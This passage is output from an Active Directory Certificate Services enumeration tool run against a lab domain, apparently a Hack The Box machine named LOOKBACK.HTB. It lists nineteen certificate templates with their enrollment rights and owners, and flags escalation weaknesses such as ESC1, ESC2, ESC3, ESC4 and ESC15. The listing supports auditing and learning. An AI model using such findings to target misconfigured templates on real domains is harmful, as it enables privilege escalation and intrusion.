        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Computers
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Administrator
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  2
    Template Name                       : KerberosAuthentication
    Display Name                        : Kerberos Authentication
    Certificate Authorities             : lookback-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDomainDns
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Enterprise Read-only Domain Controllers
                                          LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Controllers
                                          LOOKBACK.HTB\Enterprise Admins
                                          LOOKBACK.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Controllers
                                          LOOKBACK.HTB\Enterprise Admins
                                          LOOKBACK.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : LOOKBACK.HTB\Domain Controllers
                                          LOOKBACK.HTB\Enterprise Domain Controllers
    [+] User Enrollable Principals      : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  3
    Template Name                       : OCSPResponseSigning
    Display Name                        : OCSP Response Signing
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AddOcspNocheck
                                          Norevocationinfoinissuedcerts
    Extended Key Usage                  : OCSP Signing
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : msPKI-Asymmetric-Algorithm`PZPWSTR`RSA`msPKI-Hash-Algorithm`PZPWSTR`SHA1`msPKI-Key-Security-Descriptor`PZPWSTR`D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;GR;;;S-1-5-80-3804348527-3718992918-2141599610-3686422417-2726379419)`msPKI-Key-Usage`DWORD`2`
    Authorized Signatures Required      : 0
    Schema Version                      : 3
    Validity Period                     : 2 weeks
    Renewal Period                      : 2 days
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  4
    Template Name                       : RASAndIASServer
    Display Name                        : RAS and IAS Server
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
                                          LOOKBACK.HTB\RAS and IAS Servers
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
                                          LOOKBACK.HTB\RAS and IAS Servers
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  5
    Template Name                       : Workstation
    Display Name                        : Workstation Authentication
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Computers
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Computers
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  6
    Template Name                       : DirectoryEmailReplication
    Display Name                        : Directory Email Replication
    Certificate Authorities             : lookback-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid
                                          SubjectAltRequireDns
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Directory Service Email Replication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Enterprise Read-only Domain Controllers
                                          LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Controllers
                                          LOOKBACK.HTB\Enterprise Admins
                                          LOOKBACK.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Controllers
                                          LOOKBACK.HTB\Enterprise Admins
                                          LOOKBACK.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : LOOKBACK.HTB\Domain Controllers
                                          LOOKBACK.HTB\Enterprise Domain Controllers
    [+] User Enrollable Principals      : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  7
    Template Name                       : DomainControllerAuthentication
    Display Name                        : Domain Controller Authentication
    Certificate Authorities             : lookback-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Enterprise Read-only Domain Controllers
                                          LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Controllers
                                          LOOKBACK.HTB\Enterprise Admins
                                          LOOKBACK.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Controllers
                                          LOOKBACK.HTB\Enterprise Admins
                                          LOOKBACK.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : LOOKBACK.HTB\Domain Controllers
                                          LOOKBACK.HTB\Enterprise Domain Controllers
    [+] User Enrollable Principals      : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  8
    Template Name                       : KeyRecoveryAgent
    Display Name                        : Key Recovery Agent
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PendAllRequests
                                          PublishToKraContainer
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Key Recovery Agent
    Requires Manager Approval           : True
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  9
    Template Name                       : CAExchange
    Display Name                        : CA Exchange
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
    Extended Key Usage                  : Private Key Archival
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 week
    Renewal Period                      : 1 day
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  10
    Template Name                       : CrossCA
    Display Name                        : Cross Certification Authority
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : Qualified Subordination
    Authorized Signatures Required      : 1
    Schema Version                      : 2
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  11
    Template Name                       : ExchangeUserSignature
    Display Name                        : Exchange Signature Only
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Secure Email
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  12
    Template Name                       : ExchangeUser
    Display Name                        : Exchange User
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Secure Email
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  13
    Template Name                       : CEPEncryption
    Display Name                        : CEP Encryption
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  14
    Template Name                       : OfflineRouter
    Display Name                        : Router (Offline request)
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  15
    Template Name                       : IPSECIntermediateOffline
    Display Name                        : IPSec (Offline request)
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : IP security IKE intermediate
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  16
    Template Name                       : IPSECIntermediateOnline
    Display Name                        : IPSec
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : IP security IKE intermediate
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Computers
                                          LOOKBACK.HTB\Domain Controllers
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Computers
                                          LOOKBACK.HTB\Domain Controllers
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  17
    Template Name                       : SubCA
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : lookback-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User Enrollable Principals      : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC2                              : Template can be used for any purpose.
      ESC3                              : Template has Certificate Request Agent EKU set.
      ESC15                             : Enrollee supplies subject and schema version is 1.
      ESC4                              : Template is owned by user.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
  18
    Template Name                       : CA
    Display Name                        : Root Certification Authority
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  19
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : lookback-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User Enrollable Principals      : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
